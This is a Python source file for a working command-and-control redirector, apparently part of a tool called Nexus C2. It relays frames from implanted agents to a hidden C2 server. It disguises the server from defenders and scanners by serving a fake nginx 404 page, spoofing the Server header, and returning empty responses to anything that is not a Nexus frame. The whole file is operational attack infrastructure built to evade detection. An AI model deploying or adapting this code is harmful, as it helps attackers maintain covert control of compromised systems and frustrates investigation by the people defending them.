"""
Nexus C2 — Smart Redirector

Sits between agents and the real C2 server. Filters out non-Nexus traffic
so defenders probing the IP only see a generic web server response.

Topology:
  [Agent] ──POST──▶ [Redirector :9090] ──POST──▶ [C2 :8080]

Filtering rules:
  - GET /        → fake nginx 404 (defenders probing the URL see nothing)
  - POST / with invalid first byte → 200 OK empty (looks like a web API)
  - POST / with valid Nexus frame  → forwarded to real C2
"""

import logging
import os

from aiohttp import web, ClientSession, ClientTimeout

C2_URL          = os.environ.get("NEXUS_C2_URL",          "http://127.0.0.1:8080")
REDIRECTOR_PORT = int(os.environ.get("NEXUS_REDIRECTOR_PORT", "9090"))

_VALID_TYPES  = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}
_TIMEOUT      = ClientTimeout(total=30)
_FAKE_SERVER  = "nginx/1.24.0"

log = logging.getLogger("nexus.redirector")


@web.middleware
async def _disguise_headers(request: web.Request, handler) -> web.Response:
    resp = await handler(request)
    resp.headers["Server"] = _FAKE_SERVER
    return resp

# Fake response served to defenders / scanners
_FAKE_404 = b"""<!DOCTYPE html>
<html><head><title>404 Not Found</title></head>
<body><center><h1>404 Not Found</h1></center><hr><center>nginx/1.24.0</center></body>
</html>"""


async def handle(request: web.Request) -> web.Response:
    # GET requests → fake nginx 404 (opsec: don't reveal C2 presence)
    if request.method == "GET":
        log.info("PROBE  %s %s (blocked)", request.method, request.path)
        return web.Response(body=_FAKE_404, status=404, content_type="text/html",
                            headers={"Server": "nginx/1.24.0"})

    body = await request.read()

    # Filter: first byte must be a valid Nexus message type
    if not body or body[0] not in _VALID_TYPES:
        log.warning("FILTER %d bytes, type=0x%02x — not a Nexus frame",
                    len(body), body[0] if body else 0)
        return web.Response(status=200, text="")

    # Forward valid Nexus frames to the real C2 using the shared session
    fwd_headers = {}
    for h in ("Content-Type", "X-Session-Id"):
        if h in request.headers:
            fwd_headers[h] = request.headers[h]

    session: ClientSession = request.app["http_session"]
    try:
        async with session.post(C2_URL + "/", data=body, headers=fwd_headers) as resp:
            data = await resp.read()
            ct   = resp.headers.get("Content-Type", "application/octet-stream")
            log.info("FWD    → %d B | ← %d B (status=%d)", len(body), len(data), resp.status)
            return web.Response(body=data, status=resp.status, content_type=ct)
    except Exception as exc:
        log.error("forward error: %s", exc)
        return web.Response(status=502, text="")


async def _on_startup(app: web.Application) -> None:
    app["http_session"] = ClientSession(timeout=_TIMEOUT)
    log.info("redirector → C2 at %s", C2_URL)


async def _on_cleanup(app: web.Application) -> None:
    await app["http_session"].close()


def build_app() -> web.Application:
    app = web.Application(
        middlewares=[_disguise_headers],
        client_max_size=1 * 1024 * 1024,
    )
    app.router.add_route("*", "/", handle)
    app.on_startup.append(_on_startup)
    app.on_cleanup.append(_on_cleanup)
    return app
